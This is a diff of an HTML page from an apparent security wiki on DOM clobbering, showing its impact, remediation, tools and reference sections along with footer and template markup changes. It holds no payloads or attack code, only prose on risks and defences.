+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Cross-Site Scripting (XSS):</strong> a clobbered variable that feeds into <code>innerHTML</code>, <code>eval()</code>, or a script <code>src</code> attribute executes attacker-controlled markup or code</li>
 <li><strong>Open Redirect:</strong> clobbering a variable later used to build a redirect (<code>location.href = config.redirectUrl</code>) sends victims to an attacker-chosen domain</li>
@@ -1535,10 +1449,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>UI Redress / Clickjacking-style attacks:</strong> injected iframes or hijacked submit handlers can trick users into interacting with attacker content while believing it&rsquo;s the real page</li>
 <li><strong>Third-Party Library Risk:</strong> even a clean, well-written first-party app can be vulnerable purely because a library it loads relies on an unchecked global variable - meaning the app doesn&rsquo;t need its own bug, just an HTML injection point anywhere on the page</li>
 </ul>
-<h2 id="remediation">
-  Remediation
-  <a class="anchor" href="#remediation">#</a>
-</h2>
+<h2 id="remediation">Remediation<a class="anchor" href="#remediation">#</a></h2>
 <ul>
 <li><strong>Never trust a global variable exists or is the right type:</strong> always check with something like <code>typeof x === 'function'</code> or <code>x instanceof HTMLElement === false</code> before using a value pulled from <code>window.x</code> or <code>document.x</code></li>
 <li><strong>Explicitly declare variables</strong> with <code>let</code>/<code>const</code> and a concrete value, instead of relying on whatever the browser&rsquo;s automatic element-to-global mapping happens to produce</li>
@@ -1549,18 +1460,12 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Prefer <code>textContent</code> over <code>innerHTML</code></strong> wherever you&rsquo;re not intentionally rendering HTML, and avoid property-iteration loops (like looping <code>.attributes</code>) that can be shadowed by attacker-controlled elements</li>
 <li><strong>Flag legacy vanilla-JS code during review</strong> - modern frameworks like React and Vue don&rsquo;t expose the raw DOM-to-global mapping the same way, so hand-written older JS is disproportionately at risk and worth extra scrutiny</li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <ul>
 <li>Burp Suite (DOM Invader)</li>
 <li>Chrome DevTools</li>
 </ul>
-<h2 id="good-to-read">
-  Good to Read:
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read:<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://hackerone.com/reports/308158" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/308158</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noreferrer noopener nofollow">https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1568,10 +1473,7 @@ https://github.com/alex-shpak/hugo-book
 <li><a href="https://portswigger.net/research/bypassing-csp-via-dom-clobbering" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/research/bypassing-csp-via-dom-clobbering</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://github.com/ridpath/dom-clobbering-cheatsheet" target="_blank" rel="noreferrer noopener nofollow">https://github.com/ridpath/dom-clobbering-cheatsheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/dom-based/dom-clobbering</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1586,49 +1488,62 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/DOM%20Clobbering.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Denial-of-Service-DOS/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Denial of Service (DOS)</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/GraphQL/" class="flex align-center">
+        <span>GraphQL</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1662,15 +1577,24 @@ https://github.com/alex-shpak/hugo-book
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
